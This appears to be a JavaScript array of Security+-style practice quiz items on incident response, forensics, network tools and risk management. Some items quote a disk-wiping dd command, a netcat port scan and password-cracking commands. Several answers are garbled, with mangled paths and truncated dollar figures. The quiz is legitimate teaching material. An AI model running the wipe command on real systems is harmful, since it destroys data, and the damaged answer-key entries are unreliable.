        "Susan has discovered evidence of a compromise that occurred approximately five months ago. She wants to conduct an incident investigation but is concerned about whether the data will exist. What policy guides how long logs and other data are kept in most organizations?",
      incorrectAnswers: [
        "The organization's data classification policy",
        "The organization's backup policy",
        "The organization's legal hold policy",
      ],
      correctAnswer: "The organization's retention policy",
    },
    {
      question:
        "Selah executes the following command on a system: dd if=/dev/zero of=/dev/sda bs=4096. What has she accomplished?",
      incorrectAnswers: [
        "Copying the disk /dev/zero to the disk /dev/sda",
        "Formatting /dev/sda",
        "Cloning /dev/sda1",
      ],
      correctAnswer: "Writing zeroes to all of /dev/sda",
    },
    {
      question:
        "Jim is preparing a presentation about his organization's incident response process and wants to explain why communications with involved groups and individuals across the organization are important. Which of the following is the primary reason that organizations communicate with and involve staff from affected areas throughout the organization in incident response efforts?",
      incorrectAnswers: ["Legal compliance", "Retention policies", "A COOP"],
      correctAnswer: "Stakeholder management",
    },
    {
      question:
        "Elle is conducting an exercise for her organization and wants to run an exercise that is as close to an actual event as possible. What type of event should she run to help her organization get this type of real-world practice?",
      incorrectAnswers: ["A tabletop exercise", "A walk-through", "A wargame"],
      correctAnswer: "A simulation",
    },
    {
      question:
        "Erin wants to determine what devices are on a network but cannot use a port scanner or vulnerability scanner. Which of the following techniques will provide the most data about the systems that are active on the network?",
      incorrectAnswers: [
        "Run Wireshark in promiscuous mode.",
        "Query DNS for all A records in the domain.",
        "Run netstat on a local workstation.",
      ],
      correctAnswer: "Review the CAM tables for all the switches in the network.",
    },
    {
      question:
        "What SIEM component collects data and sends it to the SIEM for analysis?",
      incorrectAnswers: [
        "An alert level",
        "A trend analyzer",
        "A sensitivity threshold",
      ],
      correctAnswer: "A sensor",
    },
    {
      question:
        "Alaina sets her antimalware solution to move infected files to a safe storage location without removing them from the system. What type of setting has she enabled?",
      incorrectAnswers: ["Purge", "Deep-freeze", "Retention"],
      correctAnswer: "Quarantine",
    },
    {
      question:
        "A senior vice president in the organization that Chuck works in recently lost a phone that contained sensitive business plans and information about suppliers, designs, and other important materials. After interviewing the vice president, Chuck finds out that the phone did not have a passcode set and was not encrypted, and that it could not be remotely wipeWhat type of control should Chuck recommend for his company to help prevent future issues like this?",
      incorrectAnswers: [
        "Use containment techniques on the impacted phones.",
        "Deploy a DLP system.",
        "Isolate the impacted phones.",
      ],
      correctAnswer: "Deploy an MDM system.",
    },
    {
      question:
        "The school that Gabby works for wants to prevent students from browsing websites that are not related to school work. What type of solution is best suited to help prevent this?",
      incorrectAnswers: ["A DLP", "A firewall", "An IDS"],
      correctAnswer: "A content filter",
    },
    {
      question:
        "Frank knows that forensic information he is interested in is stored on a system's hard drive. If he wants to follow the order of volatility, which of the following items should be forensically captured after the hard drive?",
      incorrectAnswers: ["Caches and registers", "Virtual memory", "RAM"],
      correctAnswer: "Backups",
    },
    {
      question:
        "Greg runs the following commanWhat occurs? chmod -R 755 /home/greg/files",
      incorrectAnswers: [
        "All of the files in /home/greg/ are set to allow the group to read, write, and execute them, and Greg and the world can only read them.",
        "The read, write, and execute permissions will be removed from all files in the /home/greg/files directory.",
        "A new directory will be created with read, write, and execute permissions for the world and read-only permissions for Greg and the group he is in.",
      ],
      correctAnswer:
        "All of the files in /home/greg/files are set to allow Greg to read, write, and execute them, and the group and the world can only read them.",
    },
    {
      question:
        "Charles wants to ensure that the forensic work that he is doing cannot be repudiateHow can he validate his attestations and documentation to ensure nonrepudiation?",
      incorrectAnswers: [
        "Encrypt all forensic output.",
        "Create a MD5 checksum of all images.",
        "All of the above",
      ],
      correctAnswer: "Digitally sign the records.",
    },
    {
      question:
        "Diana wants to capture the contents of physical memory using a command-line tool on a Linux system. Which of the following tools can accomplish this task?",
      incorrectAnswers: ["ramdump", "system -dump", "memcpy"],
      correctAnswer: "memdump",
    },
    {
      question:
        "Valerie wants to capture the pagefile from a Windows system. Where can she find the file for acquisition?",
      incorrectAnswers: [
        "C:Windowsswap",
        "C:Windows\\usersswap.sys",
        "C:swappagefile.sys",
      ],
      correctAnswer: "C:pagefile.sys",
    },
    {
      question:
        "Megan needs to conduct a forensic investigation of a virtual machine (VM) hosted in a VMware environment as part of an incident response effort. What is the best way for her to collect the VM?",
      incorrectAnswers: [
        "By using dd to an external drive",
        "By using dd to an internal drive",
        "By using a forensic imaging device after removing the server's drives",
      ],
      correctAnswer: "As a snapshot using the VMware built-in tools",
    },
    {
      question:
        "What forensic concept is key to establishing provenance for a forensic artifact?",
      incorrectAnswers: ["Right to audit", "Preservation", "Timelines"],
      correctAnswer: "Chain of custody",
    },
    {
      question:
        "What role do digital forensics most often play in counterintelligence efforts?",
      incorrectAnswers: [
        "They are used to determine what information was stolen by spies.",
        "They are required for training purposes for intelligence agents.",
        "They do not play a role in counterintelligence.",
      ],
      correctAnswer:
        "They are used to analyze tools and techniques used by intelligence agencies.",
    },
    {
      question:
        "Which of the following groups is not typically part of an incident response team?",
      incorrectAnswers: [
        "Security analysts",
        "Management",
        "Communications staff",
      ],
      correctAnswer: "Law enforcement",
    },
    {
      question:
        "Bob needs to block Secure Shell (SSH) traffic between two security zones. Which of the following Linux iptables firewall rules will block that traffic from the 10.0.10.0/24 network to the system the rule is running on?",
      incorrectAnswers: [
        "iptables -D OUTPUT -p udp -dport 21 -i eth0 -s 10.0.10.255 -j DROP",
        "iptables -A OUTPUT -p udp --dport 22 -i eth0 -s 10.0.10.255 -j BLOCK",
        "iptables -D INPUT -p udp --dport 21 -I eth0 -s 10.0.10.0/24 -j DROP",
      ],
      correctAnswer:
        "iptables -A INPUT -p tcp --dport 22 -i eth0 -s 10.0.10.0/24 -j DROP",
    },
    {
      question:
        "Maria wants to add entries into the Linux system log so that they will be sent to her security information and event management (SIEM) device when specific scripted events occur. What Linux tool can she use to do this?",
      incorrectAnswers: ["cat", "slogd", "tail"],
      correctAnswer: "logger",
    },
    {
      question:
        "Amanda's organization does not currently have an incident response plan. Which of the following reasons is not one she should present to management in support of creating one?",
      incorrectAnswers: [
        "It will help responders react appropriately under stress.",
        "It will prepare the organization for incidents.",
        "It may be required for legal or compliance reasons.",
      ],
      correctAnswer: "It will prevent incidents from occurring.",
    },
    {
      question:
        "Which of the following scenarios is least likely to result in data recovery being possible?",
      incorrectAnswers: [
        "A file is deleted from a disk.",
        "A file is overwritten by a smaller file.",
        "A hard drive is quick-formatted.",
      ],
      correctAnswer: "A disk is degaussed.",
    },
    {
      question:
        "Henry records a video of the removal of a drive from a system as he is preparing for a forensic investigation. What is the most likely reason for Henry to record the video?",
      incorrectAnswers: [
        "To meet the order of volatility",
        "To establish guilt beyond a reasonable doubt",
        "To ensure data preservation",
      ],
      correctAnswer:
        "To document the chain of custody and provenance of the drive",
    },
    {
      question:
        "Adam wants to use a tool to edit the contents of a drive. Which of the following tools is best suited to that purpose?",
      incorrectAnswers: ["Autopsy", "dd", "FTK Imager"],
      correctAnswer: "WinHex",
    },
    {
      question:
        "Jill wants to build a checklist that includes all the steps to respond to a specific incident. What type of artifact should she create to do so in her security orchestration, automation, and response (SOAR) environment?",
      incorrectAnswers: ["A BC plan", "A DR plan", "A runbook"],
      correctAnswer: "A playbook",
    },
    {
      question:
        "Alaina wants to use a password cracker against hashed passwords. Which of the following items is most important for her to know before she does this?",
      incorrectAnswers: [
        "The length of the passwords",
        "The last date the passwords were changed",
        "The encryption method used for the passwords",
      ],
      correctAnswer: "The hashing method used for the passwords",
    },
    {
      question:
        "Vincent wants to ensure that his staff does not install a popular game on the workstations they are issueWhat type of control could he deploy as part of his endpoint security solution that would most effectively stop this?",
      incorrectAnswers: [
        "An application approved list",
        "A DLP",
        "A content filter",
      ],
      correctAnswer: "An application block list",
    },
    {
      question:
        "Charlene wants to set up a tool that can allow her to see all the systems a given IP address connects to and how much data is sent to that IP by port and protocol. Which of the following tools is not suited to meet that need?",
      incorrectAnswers: ["IPFIX", "sFlow", "NetFlow"],
      correctAnswer: "IPSec",
    },
    {
      question:
        "A system that Sam is responsible for crashed, and Sam suspects malware may have caused an issue that led to the crash. Which of the following files is most likely to contain information if the malware was a file-less, memory-resident malware package?",
      incorrectAnswers: [
        "The swapfile",
        "The Windows system log",
        "The Windows security log",
      ],
      correctAnswer: "A dump file",
    },
    {
      question:
        "Which of the following commands can be used to show the route to a remote system on a Windows 10 workstation?",
      incorrectAnswers: ["traceroute", "arp", "netstat"],
      correctAnswer: "tracert",
    },
    {
      question:
        "Tools like PRTG and Cacti that monitor SNMP information are used to provide what type of information for an incident investigation?",
      incorrectAnswers: [
        "Authentication logs",
        "System log information",
        "Email metadata",
      ],
      correctAnswer: "Bandwidth monitoring",
    },
    {
      question:
        "Which of the following is not a key consideration when considering on-premises versus cloud forensic investigations?",
      incorrectAnswers: [
        "Data breach notification laws",
        "Right-to-audit clauses",
        "Regulatory requirements",
      ],
      correctAnswer: "Provenance",
    },
    {
      question:
        "The company Charles works for has recently had a stolen company cell phone result in a data breach. Charles wants to prevent future incidents of a similar nature. Which of the following mitigation techniques would be the most effective?",
      incorrectAnswers: [
        "A firewall change",
        "A DLP rule",
        "A new URL filter rule",
      ],
      correctAnswer: "Enable FDE via MDM.",
    },
    {
      question:
        "Henry runs the following command dig @8.8.8.8 example.com What will it do?",
      incorrectAnswers: [
        "Search example.com's DNS server for the host 8.8.8.8.",
        "Look up the hostname for 8.8.8.8.",
        "Perform open source intelligence gathering about 8.8.8.8 and example.com.",
      ],
      correctAnswer: "Search 8.8.8.8's DNS information for example.com.",
    },
    {
      question:
        "Greg is collecting a forensic image of a drive using FTK Imager, and he wants to ensure that he has a valid copy. What should he do next?",
      incorrectAnswers: [
        "Run the Linux cmp command to compare the two files.",
        "Calculate an AES-256 hash of the two drives.",
        "Compare the MD5 of each file on the drive to the MD5 of each file in the image.",
      ],
      correctAnswer: "Compare an MD5 or SHA-1 hash of the drive to the image.",
    },
    {
      question:
        "Adam needs to search for a string in a large text file. Which of the following tools should he use to most efficiently find every occurrence of the text he is searching for?",
      incorrectAnswers: ["cat", "head", "tail"],
      correctAnswer: "grep",
    },
    {
      question:
        "Angela wants to use segmentation as part of her mitigation techniques. Which of the following best describes a segmentation approach to network security?",
      incorrectAnswers: [
        "Removing potentially infected or compromised systems from the network",
        "Using firewalls and other tools to limit the spread of an active infection",
        "Adding security systems or devices to prevent data loss and exposure",
      ],
      correctAnswer:
        "Partitioning the network into segments based on user and system roles and security requirements",
    },
    {
      question:
        "Charlene has been asked to write a business continuity (BC) plan for her organization. Which of the following will a business continuity plan best handle?",
      incorrectAnswers: [
        "How to respond during a person-made disaster",
        "How to respond during a natural disaster",
        "All of the above",
      ],
      correctAnswer:
        "How to keep the organization running during a system outage",
    },
    {
      question:
        "Brad wants to create a self-signed x.509 certificate. Which of the following tools can be used to perform this task?",
      incorrectAnswers: ["hping", "Apache", "scp"],
      correctAnswer: "OpenSSL",
    },
    {
      question:
        "Cameron wants to test for commonly used passwords in his organization. Which of the following commands would be most useful if he knows that his organization's name, mascot, and similar terms are often used as passwords?",
      incorrectAnswers: [
        'ssh -test -"mascotname, orgname',
        "john -show passwordfile.txt",
        'crack -passwords -wordlist "mascotname, orgname',
      ],
      correctAnswer: 'john --wordlist "mywords.txt" --passwordfile.txt',
    },
    {
      question: "Which of the following capabilities is not built into Autopsy?",
      incorrectAnswers: [
        "Timeline generation",
        "Automatic image filtering",
        "Communication visualization",
      ],
      correctAnswer: "Disk imaging",
    },
    {
      question:
        "Alaina's company is considering signing a contract with a cloud service provider, and wants to determine how secure their services are. Which of the following is a method she is likely to be able to use to assess it?",
      incorrectAnswers: [
        "Ask for permission to vulnerability scan the vendor's production service.",
        "Conduct an audit of the organization.",
        "Hire a third party to audit the organization.",
      ],
      correctAnswer: "Review an existing SOC audit.",
    },
    {
      question:
        "Erin is working through the Cyber Kill Chain and has completed the exploitation phase as part of a penetration test. What step would come next?",
      incorrectAnswers: ["Lateral movement", "Obfuscation", "Exfiltration"],
      correctAnswer: "Privilege escalation",
    },
    {
      question:
        "Dana wants to use an exploitation framework to perform a realistic penetration test of her organization. Which of the following tools would fit that requirement?",
      incorrectAnswers: ["Cuckoo", "theHarvester", "Nessus"],
      correctAnswer: "Metasploit",
    },
    {
      question:
        "Cynthia has been asked to build a playbook for the SOAR system that her organization uses. What will she build?",
      incorrectAnswers: [
        "An automated incident response process that will be run to support the incident response (IR) team",
        "A trend analysis-driven script that will provide instructions to the IR team",
        "A set of actions that the team will perform to use the SOAR to respond to an incident",
      ],
      correctAnswer:
        "A set of rules with actions that will be performed when an event occurs using data collected or provided to the SOAR system",
    },
    {
      question:
        "Gurvinder's corporate datacenter is located in an area that FEMA has identified as being part of a 100-year flood plain. He knows that there is a chance in any given year that his datacenter could be completely flooded and underwater, and he wants to ensure that his organization knows what to do if that happens. What type of plan should he write?",
      incorrectAnswers: [
        "A Continuity of Operations Plan",
        "A business continuity plan",
        "A flood insurance plan",
      ],
      correctAnswer: "A disaster recovery plan",
    },
    {
      question:
        "Frank wants to identify where network latency is occurring between his computer and a remote server. Which of the following tools is best suited to identifying both the route used and which systems are responding in a timely manner?",
      incorrectAnswers: ["ping", "tracert", "netcat"],
      correctAnswer: "pathping",
    },
    {
      question:
        "Derek wants to see what DNS information can be queried for his organization as well as what hostnames and subdomains may exist. Which of the following tools can provide both DNS query information and Google search information about hosts and domains through a single tool?",
      incorrectAnswers: ["dig", "host", "dnscat"],
      correctAnswer: "dnsenum",
    },
    {
      question:
        "Jill has been asked to perform data recovery due to her forensic skills. What should she tell the person asking to perform data recovery to give her the best chance of restoring lost files that were accidentally deleted?",
      incorrectAnswers: [
        "Immediately reboot using the reset switch to create a lost file memory dump.",
        'Turn off "secure delete" so that the files can be more easily recovered.',
        "All of the above",
      ],
      correctAnswer: "Do not save any files or make any changes to the system.",
    },
    {
      question: "What phase follows lateral movement in the Cyber Kill Chain?",
      incorrectAnswers: ["Exfiltration", "Exploitation", "Privilege escalation"],
      correctAnswer: "Anti-forensics",
    },
    {
      question:
        "Veronica has completed the recovery phase of her organization's incident response plan. What phase should she move into next?",
      incorrectAnswers: ["Preparation", "Recovery", "Documentation"],
      correctAnswer: "Lessons learned",
    },
    {
      question:
        "Michelle has been asked to sanitize a number of drives to ensure that sensitive data is not exposed when systems are removed from service. Which of the following is not a valid means of sanitizing hard drives?",
      incorrectAnswers: [
        "Physical destruction",
        "Degaussing",
        "Zero-wiping the drives",
      ],
      correctAnswer: "Quick-formatting the drives",
    },
    {
      question:
        "Bart is investigating an incident, and needs to identify the creator of a Microsoft Office document. Where would he find that type of information?",
      incorrectAnswers: [
        "In the filename",
        "In the Microsoft Office log files",
        "In the Windows application log",
      ],
      correctAnswer: "In the file metadata",
    },
    {
      question:
        "Nathaniel wants to allow Chrome through the Windows Defender firewall. What type of firewall rule change will he need to permit this?",
      incorrectAnswers: [
        "Allow TCP 80 and 443 traffic from the system to the Internet.",
        "Allow TCP 80 and 443 traffic from the Internet to the system.",
        "All of the above",
      ],
      correctAnswer:
        "Add Chrome to the Windows Defender Firewall allowed applications.",
    },
    {
      question:
        "Nathan wants to perform whois queries on all the hosts in a class C network. Which of the following tools can do that and also be used to discover noncontiguous IP blocks in an automated fashion?",
      incorrectAnswers: ["netcat", "dig", "nslookup"],
      correctAnswer: "dnsenum",
    },
    {
      question:
        "What key forensic tool relies on correctly set system clocks to work properly?",
      incorrectAnswers: [
        "Disk hashing",
        "Forensic disk acquisition",
        "File metadata analysis",
      ],
      correctAnswer: "Timelining",
    },
    {
      question:
        "Valerie is writing her organization's forensic playbooks and knows that the state that she operates in has a data breach notification law. Which of the following key items is most likely to be influenced by that law?",
      incorrectAnswers: [
        "Whether Valerie calls the police for forensic investigation help",
        "The certification types and levels that her staff have to maintain",
        "The maximum number of residents that she can notify about a breach",
      ],
      correctAnswer:
        "The maximum amount of time until she has to notify customers of sensitive data breaches",
    },
    {
      question:
        "As part of a breach response, Naomi discovers that Social Security numbers (SSNs) were sent in a spreadsheet via email by an attacker who gained control of a workstation at her company's headquarters. Naomi wants to ensure that more SSNs are not sent from her environment. What type of mitigation technique is most likely to prevent this while allowing operations to continue in as normal a manner as possible?",
      incorrectAnswers: [
        "Antimalware installed at the email gateway",
        "A firewall that blocks all outbound email",
        "An IDS rule blocking SSNs in email",
      ],
      correctAnswer: "A DLP rule blocking SSNs in email",
    },
    {
      question:
        "Troy wants to review metadata about an email he has received to determine what system or server the email was sent from. Where can he find this information?",
      incorrectAnswers: [
        "In the email message's footer",
        "In the to: field",
        "In the from: field",
      ],
      correctAnswer: "In the email message's headers",
    },
    {
      question:
        "Henry is working with local police on a forensic case and discovers that he needs data from a service provider in another state. What issue is likely to limit their ability to acquire data from the service provider?",
      incorrectAnswers: ["Venue", "Legislation", "Breach laws"],
      correctAnswer: "Jurisdiction",
    },
    {
      question:
        "Olivia wants to test the strength of passwords on systems in her network. Which of the following tools is best suited to that task?",
      incorrectAnswers: ["Rainbow tables", "Crack.it", "TheHunter"],
      correctAnswer: "John the Ripper",
    },
    {
      question: "What U.S. federal agency is in charge of COOP?",
      incorrectAnswers: ["The USDA", "The NSA", "The FBI"],
      correctAnswer: "FEMA",
    },
    {
      question:
        "Elaine wants to write a series of scripts to gather security configuration information from Windows 10 workstations. What tool should she use to perform this task?",
      incorrectAnswers: ["Bash", "Python", "SSH"],
      correctAnswer: "PowerShell",
    },
    {
      question:
        "As part of his incident response, Ramon wants to determine what was said on a Voice over IP (VoIP) call. Which of the following data sources will provide him with the audio from the call?",
      incorrectAnswers: ["Call manager logs", "SIP logs", "None of the above"],
      correctAnswer: "A Wireshark capture of traffic from the phone",
    },
    {
      question:
        "Isabelle wants to gather information about what systems a host is connecting to, how much traffic is sent, and similar details. Which of the following options would not allow her to perform that task?",
      incorrectAnswers: ["IPFIX", "NetFlow", "sFlow"],
      correctAnswer: "NXLog",
    },
    {
      question:
        "As part of an incident response process, Pete puts a compromised system onto a virtual LAN (VLAN) that he creates that only houses that system and does not allow it access to the Internet. What mitigation technique has he used?",
      incorrectAnswers: ["Containment", "Segmentation", "Eradication"],
      correctAnswer: "Isolation",
    },
    {
      question:
        "Lucca needs to conduct a forensic examination of a live virtual machine (VM). What forensic artifact should he acquire?",
      incorrectAnswers: [
        "An image of live memory using FTK Imager from the VM",
        "A dd image of the virtual machine disk image",
        "All of the above",
      ],
      correctAnswer:
        "A snapshot of the VM using the underlying virtualization environment",
    },
    {
      question:
        "James has a PCAP file that he saved while conducting an incident response exercise. He wants to determine if his intrusion prevention system (IPS) could detect the attack after configuring new detection rules. What tool will help him use the PCAP file for his testing?",
      incorrectAnswers: ["hping", "tcpdump", "Cuckoo"],
      correctAnswer: "tcpreplay",
    },
    {
      question:
        "What type of file is created when Windows experiences a blue screen of death?",
      incorrectAnswers: ["A security log", "A blue log", "A tcpdump"],
      correctAnswer: "A dump file",
    },
    {
      question:
        "Ed wants to ensure that a compromise on his network does not spread to parts of the network with different security levels. What mitigation technique should he use prior to the attack to help with this?",
      incorrectAnswers: ["Isolation", "Fragmentation", "Tiering"],
      correctAnswer: "Segmentation",
    },
    {
      question:
        "Derek has acquired over 20 hard drives as part of a forensic investigation. What key process is important to ensure that each drive is tracked and managed properly over time?",
      incorrectAnswers: [
        "Taking pictures of each drive",
        "Labeling each drive with its order of volatility",
        "Interviewing each person whose drive is imaged",
      ],
      correctAnswer: "Tagging the drives",
    },
    {
      question:
        "What term describes the ownership, custody, and acquisition of digital forensic artifacts and images?",
      incorrectAnswers: ["E-discovery", "Jurisdiction", "Volatility"],
      correctAnswer: "Provenance",
    },
    {
      question:
        "Elle wants to acquire the live memory (RAM) from a machine that is currently turned on. Which of the following tools is best suited to acquiring the contents of the system's memory?",
      incorrectAnswers: ["Autopsy", "dd", "netcat"],
      correctAnswer: "The Volatility framework",
    },
    {
      question:
        "Randy believes that a misconfigured firewall is blocking traffic sent from some systems in his network to his web server. He knows that the traffic should be coming in as HTTPS to his web server, and he wants to check to make sure the traffic is receiveWhat tool can he use to test his theory?",
      incorrectAnswers: ["tracert", "Sn1per", "traceroute"],
      correctAnswer: "Wireshark",
    },
    {
      question:
        "Ryan wants to implement a flexible and reliable remote logging environment for his Linux systems. Which of the following tools is least suited to that requirement?",
      incorrectAnswers: ["rsyslog", "NXLog", "syslog-ng"],
      correctAnswer: "syslog",
    },
    {
      question:
        "Susan has been reading about a newly discovered exploit, and wants to test her IPS rules to see if the sample code will work. In order to use the exploit, she needs to send a specifically crafted UDP packet to a DHCP server. What tool can she use to craft and send this test exploit to see if it is detected?",
      incorrectAnswers: ["scanless", "curl", "pathping"],
      correctAnswer: "hping",
    },
    {
      question:
        "Valerie wants to check to see if a SQL injection attack occurred against her web application on a Linux system. Which log file should she check for this type of information?",
      incorrectAnswers: ["The security log", "The DNS log", "The auth log"],
      correctAnswer: "The web server log",
    },
    {
      question:
        "Olivia's company has experienced a breach and believes that the attackers were able to access the company's web servers. There is evidence that the private keys for the certificates for the server were exposed and that the passphrases for the certificates were kept in the same directory. What action should Olivia take to handle this issue?",
      incorrectAnswers: [
        "Change the certificate password.",
        "Change the private key for the certificate.",
        "Change the public key for the certificate.",
      ],
      correctAnswer: "Revoke the certificates.",
    },
    {
      question:
        "Jean's company is preparing for litigation with another company that they believe has caused harm to Jean's organization. What type of legal action should Jean's lawyer take to ensure that the company preserves files and information related to the legal case?",
      incorrectAnswers: [
        "A chain of custody demand letter",
        "An e-discovery notice",
        "An order of volatility",
      ],
      correctAnswer: "A legal hold notice",
    },
    {
      question:
        "Cynthia wants to display all of the active connections on a Windows system. What command can she run to do so?",
      incorrectAnswers: ["route", "netstat -c", "hping"],
      correctAnswer: "netstat -a",
    },
    {
      question:
        "What type of mitigation places a malicious file or application in a safe location for future review or study?",
      incorrectAnswers: ["Containment", "Isolation", "Deletion"],
      correctAnswer: "Quarantine",
    },
    {
      question: "What location is commonly used for Linux swap space?",
      incorrectAnswers: ["\rootswap", "etcswap", "procswap"],
      correctAnswer: "A separate partition",
    },
    {
      question:
        "Marco is conducting a forensic investigation and is preparing to pull eight different storage devices from computers that he will analyze. What should he use to track the drives as he works with them?",
      incorrectAnswers: [
        "MD5 checksums of the drives",
        "Timestamps gathered from the drives",
        "None of the above; the drives can be identified by the data they contain",
      ],
      correctAnswer: "Tags with system, serial number, and other information",
    },
    {
      question:
        "Isaac executes the following command using netcat nc -v 10.11.10.1 1-1024 What has he done?",
      incorrectAnswers: [
        "Opened a web page",
        "Connected to a remote shell",
        "Opened a local shell listener",
      ],
      correctAnswer: "Performed a port scan",
    },
    {
      question:
        "Tony works for a large company with multiple sites. He has identified an incident in progress at one site that is connected to the organization's multisite intranet. Which of the following options is best suited to preserving the organization's function and protecting it from issues at that location?",
      incorrectAnswers: ["Isolation", "Segmentation", "None of the above"],
      correctAnswer: "Containment",
    },
    {
      question:
        "Which of the following environments is least likely to allow a right-to-audit clause in a contract?",
      incorrectAnswers: [
        "A datacenter co-location facility in your state",
        "A rented facility for a corporate headquarters",
        "A datacenter co-location facility in the same country but not the same state",
      ],
      correctAnswer: "A cloud server provider",
    },
    {
      question:
        "Alaina's organization has been suffering from successful phishing attacks, and Alaina notices a new email that has arrived with a link to a phishing site. What response option from the following will be most likely to stop the phishing attack from succeeding against her users?",
      incorrectAnswers: ["A WAF", "A patch", "An allow list"],
      correctAnswer: "A URL filter",
    },
    {
      question:
        "Ben writes down the checklist of steps that his organization will perform in the event of a cryptographic malware infection. What type of response document has he created?",
      incorrectAnswers: ["A DR plan", "A BC plan", "A runbook"],
      correctAnswer: "A playbook",
    },
    {
      question:
        "Which of the following is not information that can be gathered from a system by running the arp command?",
      incorrectAnswers: [
        "The IP address of the local system",
        "Whether the IP address is dynamic or static",
        "The MAC addresses of recently resolved local hosts",
      ],
      correctAnswer: "The MAC addresses of recently resolved external hosts",
    },
    {
      question: "What log will journalctl provide Selah access to?",
      incorrectAnswers: [
        "The event log",
        "The auth log",
        "The authentication journal",
      ],
      correctAnswer: "The systemd journal",
    },
    {
      question:
        "What phase of the incident response process often involves adding firewall rules and patching systems to address the incident?",
      incorrectAnswers: ["Preparation", "Eradication", "Containment"],
      correctAnswer: "Recovery",
    },
    {
      question:
        "Gary wants to use a tool that will allow him to download files via HTTP and HTTPS, SFTP, and TFTP from within the same script. Which command-line tool should he pick from the following list?",
      incorrectAnswers: ["hping", "theHarvester", "nmap"],
      correctAnswer: "curl",
    },
    {
      question:
        "Tim wants to check the status of malware infections in his organization using the organization's security information and event management (SIEM) device. What SIEM dashboard will tell him about whether there are more malware infections in the past few days than normal?",
      incorrectAnswers: [
        "The alerts dashboard",
        "The sensors dashboard",
        "The bandwidth dashboard",
      ],
      correctAnswer: "The trends dashboard",
    },
    {
      question:
        "Warren is gathering information about an incident and wants to follow up on a report from an end user. What digital forensic technique is often used when end users are a key part of the initial incident report?",
      incorrectAnswers: ["Email forensics", "Disk forensics", "Chain of custody"],
      correctAnswer: "Interviews",
    },
    {
      question:
        "Aaron wants to use a multiplatform logging tool that supports both Windows and Unix/Linux systems and many log formats. Which of the following tools should he use to ensure that his logging environment can accept and process these logs?",
      incorrectAnswers: ["IPFIX", "syslog", "journalctl"],
      correctAnswer: "NXLog",
    },
    {
      question:
        "Which of the following is not a common type of incident response exercise?",
      incorrectAnswers: ["Simulations", "Tabletop", "Walk-throughs"],
      correctAnswer: "Drills",
    },
    {
      question:
        "Susan needs to run a port scan of a network. Which of the following tools would not allow her to perform that type of scan?",
      incorrectAnswers: ["netcat", "nmap", "Nessus"],
      correctAnswer: "netstat",
    },
    {
      question:
        "The government agency that Vincent works for has received a Freedom of Information Act (FoIA) request and needs to provide the requested information from its email servers. What is this process called?",
      incorrectAnswers: ["Email forensics", "An inquisition", "Provenance"],
      correctAnswer: "e-discovery",
    },
  ];
  const sectionFive = [
    {
      question:
        "Caroline has been asked to find an international standard to guide her company's choices in implementing information security management systems. Which of the following would be the best choice for her?",
      incorrectAnswers: ["ISO 27017", "NIST 800-12", "NIST 800-14"],
      correctAnswer: "ISO 27002",
    },
    {
      question:
        "Adam is concerned about malware infecting machines on his network. One of his concerns is that malware would be able to access sensitive system functionality that requires administrative access. What technique would best address this issue?",
      incorrectAnswers: [
        "Implementing host-based antimalware",
        "Implementing full-disk encryption (FDE)",
        "Making certain the operating systems are patched",
      ],
      correctAnswer: "Using a nonadministrative account for normal activities",
    },
    {
      question:
        "You are responsible for setting up new accounts for your company network. What is the most important thing to keep in mind when setting up new accounts?",
      incorrectAnswers: ["Password length", "Password complexity", "Account age"],
      correctAnswer: "Least privileges",
    },
    {
      question:
        "Which of the following principles stipulates that multiple changes to a computer system should not be made at the same time?",
      incorrectAnswers: ["Due diligence", "Acceptable use", "Due care"],
      correctAnswer: "Change management",
    },
    {
      question:
        "You are a security engineer and discovered an employee using the company's computer systems to operate their small business. The employee installed their personal software on the company's computer and is using the computer hardware, such as the USB port. What policy would you recommend the company implement to prevent any risk of the company's data and network being compromised?",
      incorrectAnswers: [
        "Clean desk policy",
        "Mandatory vacation policy",
        "Job rotation policy",
      ],
      correctAnswer: "Acceptable use policy",
    },
    {
      question: "What standard is used for credit card security?",
      incorrectAnswers: ["GDPR", "COPPA", "CIS"],
      correctAnswer: "PCI-DSS",
    },
    {
      question:
        "You are a security manager for your company and need to reduce the risk of employees working in collusion to embezzle funds. Which of the following policies would you implement?",
      incorrectAnswers: ["Clean desk", "NDA", "Continuing education"],
      correctAnswer: "Mandatory vacations",
    },
    {
      question:
        "After your company implemented a clean desk policy, you have been asked to secure physical documents every night. Which of the following would be the best solution?",
      incorrectAnswers: ["Department door lock", "Proximity cards", "Onboarding"],
      correctAnswer: "Locking cabinets and drawers at each desk",
    },
    {
      question:
        "Which of the following techniques attempts to predict the likelihood a threat will occur and assigns monetary values should a loss occur?",
      incorrectAnswers: [
        "Change management",
        "Vulnerability assessment",
        "Qualitative risk assessment",
      ],
      correctAnswer: "Quantitative risk assessment",
    },
    {
      question:
        "Which of the following agreements is less formal than a traditional contract but still has a certain level of importance to all parties involved?",
      incorrectAnswers: ["SLA", "BPA", "ISA"],
      correctAnswer: "MOU",
    },
    {
      question:
        "As part of the response to a credit card breach, Sally discovers evidence that individuals in her organization were actively working to steal credit card information and personally identifiable information (PII). She calls the police to engage them for the investigation. What has she done?",
      incorrectAnswers: [
        "Public notification",
        "Outsourced the investigation",
        "Tokenized the data",
      ],
      correctAnswer: "Escalated the investigation",
    },
    {
      question:
        "You have an asset that is valued at $16,000, the exposure factor of a risk affecting that asset is 35 percent, and the annualized rate of occurrence is 75 percent. What is the SLE?",
      incorrectAnswers: ["$5,00", "$4,20", "$3,00"],
      correctAnswer: "$5,60",
    },
    {
      question:
        "During a meeting, you present management with a list of access controls used on your network. Which of the following controls is an example of a corrective control?",
      incorrectAnswers: ["IDS", "Audit logs", "Router"],
      correctAnswer: "Antivirus software",
    },
    {
      question:
        "You are the new security administrator and have discovered your company lacks deterrent controls. Which of the following would you install that satisfies your needs?",
      incorrectAnswers: [
        "Motion sensor",
        "Hidden video cameras",
        "Antivirus scanner",
      ],
      correctAnswer: "Lighting",
    },
    {
      question:
        "Your company's security policy includes system testing and security awareness training guidelines. Which of the following control types is this?",
      incorrectAnswers: [
        "Detective technical control",
        "Preventive technical control",
        "Detective administrative control",
      ],
      correctAnswer: "Preventive administrative control",
    },
    {
      question:
        "You are a security administrator for your company and you identify a security risk. You decide to continue with the current security plan. However, you develop a contingency plan in case the security risk occurs. Which of the following type of risk response technique are you demonstrating?",
      incorrectAnswers: ["Transfer", "Avoid", "Mitigate"],
      correctAnswer: "Accept",
    },
    {
      question:
        "Jim's company operates facilities in Illinois, Indiana, and Ohio, but the headquarters is in Illinois. Which state laws does Jim need to review and handle as part of his security program?",
      incorrectAnswers: [
        "All U.S. state laws",
        "Illinois",
